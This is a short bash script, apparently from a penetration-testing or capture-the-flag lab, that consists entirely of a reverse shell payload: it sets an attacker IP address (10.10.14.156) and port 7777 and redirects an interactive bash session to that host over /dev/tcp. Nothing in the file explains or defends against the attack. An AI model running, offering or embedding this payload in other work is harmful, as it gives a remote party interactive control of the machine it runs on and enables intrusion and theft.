#!/bin/bash

IP="10.10.14.156"
PORT=7777

bash -i >& /dev/tcp/$IP/$PORT 0>&1
